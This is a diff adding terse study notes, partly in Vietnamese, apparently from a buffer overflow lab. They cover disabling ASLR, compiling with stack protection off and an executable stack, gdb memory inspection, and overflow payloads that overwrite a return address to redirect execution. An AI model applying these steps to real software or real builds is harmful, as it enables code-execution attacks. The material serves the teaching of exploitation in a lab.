@@ -1,0 +1,89 @@
+ebp - frame point : dia chi co so stack frame 0
+ebp + byte => move to address memory  
+
+
+esp -> dinh 
+
+// alow buffer
+sudo sysctl -w kernel.randomize_va_space=0
+
+//Biên dịch chương trình c với các option tắt cơ chế bảo vệ stack và cho phép thực thi code trên stack
+gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
+
+//
+sudo ln -sf /bin/zsh /bin/sh
+
+-g chen debug
+bien dich : 
+
+gcc -g flag.c -o flag.out -fno-stack-protector
+
+Run :
+./flag.out 12345678
+
+ghi de : 
+./flag.out 123456787797987898797987987987987979879
+
+
+turn of stack protected 
+-fno-stack-protector
+
+// load program in gdb
+-mpreferred-stack-boundary=2  // format 
+gcc -g flag.c -o flag.out -fno-stack-protector -mpreferred-stack-boundary=2
+gdb flag.out -q // quite 
+
+list
+layout asm
+
+
+flag stack frame : PTR 
+
+break point: 
+b *address memory 
+đặt ở 2 địa chỉ PTR 
+
+run with break point 
+
+print view memory
+x/40xb $esp
+
+// Pattern 
+
+gcc -g pattern.c -o pattern.out -fno-stack-protector -mpreferred-stack-boundary=2
+gdb pattern.out -q
+
+x/32xb 0x08048441
+x/32x 0x08048447
+
+disas main
+
+/.out $(python -c "print('a'*16+'result')")
+
+// Flow
+
+gcc -g flow.c -o flow.out -fno-stack-protector -mpreferred-stack-boundary=2
+gdb flow.out -q
+
+disas main
+
+ghi địa chỉ hàm change () 
+
+tại return address
+
+ebp
+ret address
+argc
+argv
+'A' * 20 + b'\x3b\x84\x04\x08'
+0x0804843b
+$(python -c "print('A' * 200 + '\x6b\x84\x04\x08')")
+
+
+seed@94f9a4a3fa0c:~/seclabs/bof$ nm flow.out | grep change
+0804843b T change
+
+./flow.out $(python -c "print('A' * 20 + '\x3b\x84\x04\x08')")
+
+objdump -d flow.out|grep change -> view assambly
+nm flow.out | grep change
